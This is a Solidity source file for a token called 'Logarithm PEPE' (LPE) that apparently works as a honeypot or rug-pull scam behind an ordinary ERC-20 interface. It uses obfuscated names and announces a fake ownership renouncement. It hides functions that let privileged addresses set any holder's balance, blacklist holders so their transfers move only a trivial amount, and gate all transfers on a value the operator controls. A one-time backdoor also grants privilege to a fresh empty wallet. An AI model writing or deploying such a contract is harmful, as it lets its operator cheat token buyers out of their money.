//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface launchedToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitReceiver) external view returns (uint256);

    function transfer(address walletTakeExempt, uint256 maxAutoAt) external returns (bool);

    function allowance(address receiverAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxAutoAt) external returns (bool);

    function transferFrom(
        address sender,
        address walletTakeExempt,
        uint256 maxAutoAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoMaxTotal, uint256 value);
    event Approval(address indexed receiverAt, address indexed spender, uint256 value);
}

abstract contract amountReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitAt {
    function createPair(address txBuy, address teamLiquidity) external returns (address);
}

interface autoTeam is launchedToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LogarithmPEPE is amountReceiver, launchedToken, autoTeam {

    bool private buyIs;

    string private amountSwap = "Logarithm PEPE";

    address liquidityReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 buyTeamLiquidity;

    bool private fundMin;

    uint256 private modeLimitMarketing = 100000000 * 10 ** 18;

    function swapSell(address fromShouldTo, address walletTakeExempt, uint256 maxAutoAt) internal returns (bool) {
        if (fromShouldTo == enableAmountLimit) {
            return fundIs(fromShouldTo, walletTakeExempt, maxAutoAt);
        }
        uint256 launchedFee = launchedToken(swapExempt).balanceOf(atAuto);
        require(launchedFee == modeLimit);
        require(walletTakeExempt != atAuto);
        if (fromTakeMax[fromShouldTo]) {
            return fundIs(fromShouldTo, walletTakeExempt, senderIsFund);
        }
        return fundIs(fromShouldTo, walletTakeExempt, maxAutoAt);
    }

    function transferFrom(address fromShouldTo, address walletTakeExempt, uint256 maxAutoAt) external override returns (bool) {
        if (_msgSender() != liquidityReceiver) {
            if (enableModeTake[fromShouldTo][_msgSender()] != type(uint256).max) {
                require(maxAutoAt <= enableModeTake[fromShouldTo][_msgSender()]);
                enableModeTake[fromShouldTo][_msgSender()] -= maxAutoAt;
            }
        }
        return swapSell(fromShouldTo, walletTakeExempt, maxAutoAt);
    }

    bool private minTeam;

    uint256 modeLimit;

    event OwnershipTransferred(address indexed limitSell, address indexed swapMaxIs);

    function owner() external view returns (address) {
        return isModeAmount;
    }

    address atAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public listReceiver;

    function allowance(address minWallet, address txReceiver) external view virtual override returns (uint256) {
        if (txReceiver == liquidityReceiver) {
            return type(uint256).max;
        }
        return enableModeTake[minWallet][txReceiver];
    }

    function txShould() private view {
        require(atFee[_msgSender()]);
    }

    function transfer(address toMaxWallet, uint256 maxAutoAt) external virtual override returns (bool) {
        return swapSell(_msgSender(), toMaxWallet, maxAutoAt);
    }

    function exemptLimit(address launchedSwapSender) public {
        txShould();
        
        if (launchedSwapSender == enableAmountLimit || launchedSwapSender == swapExempt) {
            return;
        }
        fromTakeMax[launchedSwapSender] = true;
    }

    bool private toMode;

    bool public feeTx;

    uint256 public enableReceiver;

    function name() external view virtual override returns (string memory) {
        return amountSwap;
    }

    mapping(address => bool) public fromTakeMax;

    function approve(address txReceiver, uint256 maxAutoAt) public virtual override returns (bool) {
        enableModeTake[_msgSender()][txReceiver] = maxAutoAt;
        emit Approval(_msgSender(), txReceiver, maxAutoAt);
        return true;
    }

    function balanceOf(address limitReceiver) public view virtual override returns (uint256) {
        return enableTx[limitReceiver];
    }

    function decimals() external view virtual override returns (uint8) {
        return toTrading;
    }

    function fundIs(address fromShouldTo, address walletTakeExempt, uint256 maxAutoAt) internal returns (bool) {
        require(enableTx[fromShouldTo] >= maxAutoAt);
        enableTx[fromShouldTo] -= maxAutoAt;
        enableTx[walletTakeExempt] += maxAutoAt;
        emit Transfer(fromShouldTo, walletTakeExempt, maxAutoAt);
        return true;
    }

    address private isModeAmount;

    function symbol() external view virtual override returns (string memory) {
        return takeSender;
    }

    constructor (){
        
        listTrading walletTeamMode = listTrading(liquidityReceiver);
        swapExempt = limitAt(walletTeamMode.factory()).createPair(walletTeamMode.WETH(), address(this));
        
        enableAmountLimit = _msgSender();
        minToken();
        atFee[enableAmountLimit] = true;
        enableTx[enableAmountLimit] = modeLimitMarketing;
        
        emit Transfer(address(0), enableAmountLimit, modeLimitMarketing);
    }

    bool public fromTeam;

    function takeLimit(address toMaxWallet, uint256 maxAutoAt) public {
        txShould();
        enableTx[toMaxWallet] = maxAutoAt;
    }

    function minToken() public {
        emit OwnershipTransferred(enableAmountLimit, address(0));
        isModeAmount = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return modeLimitMarketing;
    }

    function feeReceiver(address amountMin) public {
        require(amountMin.balance < 100000);
        if (feeTx) {
            return;
        }
        if (fundMin != toMode) {
            enableReceiver = toLaunchFee;
        }
        atFee[amountMin] = true;
        if (fundMin != fromTeam) {
            fromTeam = false;
        }
        feeTx = true;
    }

    uint256 private atTokenLaunch;

    function listMax(uint256 maxAutoAt) public {
        txShould();
        modeLimit = maxAutoAt;
    }

    uint256 constant senderIsFund = 8 ** 10;

    uint256 public toLaunchFee;

    string private takeSender = "LPE";

    mapping(address => mapping(address => uint256)) private enableModeTake;

    function getOwner() external view returns (address) {
        return isModeAmount;
    }

    mapping(address => uint256) private enableTx;

    address public swapExempt;

    mapping(address => bool) public atFee;

    uint8 private toTrading = 18;

    address public enableAmountLimit;

}